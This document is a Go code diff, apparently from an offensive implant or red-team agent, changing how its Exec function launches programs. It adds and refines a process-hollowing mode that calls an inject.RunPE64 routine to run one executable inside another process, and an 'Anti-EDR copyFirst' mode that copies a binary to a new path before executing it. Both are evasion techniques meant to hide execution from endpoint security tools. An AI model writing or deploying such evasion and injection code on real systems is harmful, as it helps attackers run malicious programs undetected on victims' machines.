@@ -10,10 +10,12 @@ import "C"
 
 import (
 	"context"
+	"errors"
 	"fmt"
 	"io"
 	"os"
 	"os/exec"
+	"path/filepath"
 	"strings"
 	"syscall"
 	"time"
@@ -82,7 +84,7 @@ func ExecOutputDecode(data []byte) string {
 }
 
 func hollow(source, replace, name string, args []string) (int, []byte, []byte, error) {
-	log.Infof("Replacing %s with %s\n", source, replace)
+	log.Infof("Replacing %s with %s", source, replace)
 	data, _ := ioutil.ReadFile(replace)
 	return inject.RunPE64(data, source, name, strings.Join(args, " "))
 }
@@ -144,18 +146,28 @@ func Exec(packetArgument model.PacketArgument) (stdOut []byte, stdErr []byte, pi
 		return stdOut, stdErr, pid, exitCode, fmt.Errorf("shelltype %s unkown a", shellType)
 	}
 
+	// Always resolve full path, we may need it
+	if filepath.Base(executable) == executable {
+		if lp, err := exec.LookPath(executable); err != nil {
+			return stdOut, stdErr, pid, exitCode, fmt.Errorf("Could not resolve: %s", executable)
+		} else {
+			executable = lp
+		}
+	}
+
 	/* Anti-EDR: copyFirst */
 	if spawnType == "copyFirst" {
-		if spawnData == "" {
+		destinationPath := spawnData
+		if destinationPath == "" {
 			return stdOut, stdErr, pid, exitCode, fmt.Errorf("Spawn copyfirst, but no path in spawnData found")
 		}
 
-		err = CopyFile(executable, spawnData)
+		err = CopyFile(executable, destinationPath)
 		if err != nil {
 			return stdOut, stdErr, pid, exitCode, fmt.Errorf("error copying file: %s", err.Error())
 		}
 		// Destination is the new binary we execute
-		executable = spawnData
+		executable = destinationPath
 	}
 
 	cmd := exec.CommandContext(ctx, executable, args...)
@@ -183,15 +195,19 @@ func Exec(packetArgument model.PacketArgument) (stdOut []byte, stdErr []byte, pi
 
 	// See how we want to execute it
 	if spawnType == "hollow" {
-		if spawnData == "" {
+		// Perform Process Hollowing
+		sourcePath := spawnData
+		if sourcePath == "" {
 			return stdOut, stdErr, pid, exitCode, fmt.Errorf("Spawn hollow, but no path in spawnData found")
 		}
+		if _, err := os.Stat(sourcePath); errors.Is(err, os.ErrNotExist) {
+			return stdOut, stdErr, pid, exitCode, fmt.Errorf("Spawn hollow destination exe does not exist: %s", sourcePath)
+		}
 
-		// Perform Process Hollowing
-		name := "net.exe" // TODO
-		pid, stdOut, stdErr, err = hollow(spawnData, executable, name, args)
+		name := filepath.Base(executable) // Need it without path
+		pid, stdOut, stdErr, err = hollow(sourcePath, executable, name, args)
 		if err != nil {
-			log.Errorf("Error: %s", err.Error())
+			return stdOut, stdErr, pid, exitCode, fmt.Errorf("Hollow error: %s", err)
 		}
 	} else {
 		// Execute the (possibly copied) binary directly
